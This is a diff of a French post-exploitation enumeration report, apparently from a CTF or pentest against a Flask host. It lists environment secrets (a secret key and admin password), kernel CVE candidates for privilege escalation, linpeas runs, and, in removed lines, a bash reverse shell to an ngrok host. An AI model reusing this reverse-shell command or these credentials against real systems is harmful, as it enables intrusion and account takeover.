@@ -36,12 +36,12 @@
 ```
 SHELL=/bin/sh
 HOSTNAME=caf697ac4c37
-PWD=/home/c2-web/.test
+PWD=/home/c2-web/
 LOGNAME=c2-web
 DOMAIN=163.172.66.233
 HOME=/home/c2-web
-SECRET_KEY=SEmuz80xt4oEQK4YsFPt
-ADMIN_PASSWORD=wqHQBzgxXZ6mhpdbvL2KfE
+SECRET_KEY=SEmuz80xt4oEQK4YsFPt (pas utile, c'est le token pour les cookies)
+ADMIN_PASSWORD=wqHQBzgxXZ6mhpdbvL2KfE (pas utile, c'est les cred du site)
 ADMIN_USER=admin
 USER=c2-web
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
@@ -58,7 +58,7 @@ FLASK_RUN_FROM_CLI=true
   - Exposition : Faible
   - Requiert : `kernel.unprivileged_userns_clone=1`
 
-- **CVE-2021-22555**: `Netfilter heap OOB`
+- **CVE-2021-22555**: `Netfilter heap OOB`(testé, non vulnérable)
   - [Lien](https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html)
   - Exposition : Faible
   - Requiert : module `ip_tables` chargé
@@ -103,12 +103,8 @@ FLASK_RUN_FROM_CLI=true
 
 ## Processus en cours (lecture /proc)
 ```
-5115 bashlinpeas.sh
 5111 sort -r
-5110 bashlinpeas.sh
-2368 bashlinpeas.sh
 1920 bash -i
-1919 bash -c bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/10426 0>&1
 20   /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0 --port=5000
 19   /usr/bin/python3 /usr/local/bin/flask run --host=0.0.0.0 --port=3000
 18   sh -c flask run --host=0.0.0.0 --port=3000
@@ -223,7 +219,6 @@ root:x:0:0:/root:/bin/bash
 - **/var/log/backup.log**
 
 ## Executables & scripts ajoutés
-- `/home/c2-web/.test/linpeas.sh`
 - `/usr/local/bin/flask`
 - `/app/app.py`
 - `/app/static/assets/*`
